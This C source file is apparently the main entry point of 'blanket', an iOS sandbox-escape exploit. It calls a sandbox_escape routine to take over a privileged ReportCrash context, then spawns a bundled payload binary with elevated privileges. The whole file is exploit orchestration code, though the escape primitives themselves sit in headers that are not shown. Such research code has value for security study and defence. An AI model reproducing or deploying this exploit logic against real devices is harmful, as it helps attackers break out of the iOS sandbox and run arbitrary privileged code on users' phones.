#include "blanket/main/blanket_main.h"

#include "blanket/log/log.h"
#include "blanket/sandbox_escape/sandbox_escape.h"
#include "blanket/sandbox_escape/spawn_privileged.h"

#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>

#define PAYLOAD_NAME	"blanket_platform_payload"

// Copy the path to the current bundle into a buffer.
static void
get_bundle_path(char *buffer, size_t size) {
	CFBundleRef bundle = CFBundleGetMainBundle();
	CFURLRef url = CFBundleCopyBundleURL(bundle);
	CFURLGetFileSystemRepresentation(url, true, (UInt8 *)buffer, size);
	CFRelease(url);
}

// Spawn the specified payload.
static bool
spawn_payload(threadexec_t priv_tx) {
	// Build the path to the payload.
	char path[1024];
	get_bundle_path(path, sizeof(path));
	strlcat(path, "/", sizeof(path));
	strlcat(path, PAYLOAD_NAME, sizeof(path));
	// Build our PID string.
	char pid_arg[16];
	snprintf(pid_arg, sizeof(pid_arg), "%d", getpid());
	// Spawn the payload.
	const char *argv[] = { path, pid_arg, NULL };
	int stdio_fds[3] = { -1, STDERR_FILENO, STDERR_FILENO };
	pid_t pid = spawn_privileged(priv_tx, path, argv, NULL, stdio_fds);
	return (pid > 0);
}

void
blanket_main() {
	DEBUG_TRACE(1, "%s", __func__);
	threadexec_t reportcrash_tx = sandbox_escape();
	if (reportcrash_tx == NULL) {
		goto fail;
	}
	spawn_payload(reportcrash_tx);
	threadexec_deinit(reportcrash_tx);
fail:
	DEBUG_TRACE(1, "%s: done", __func__);
	exit(1);
}
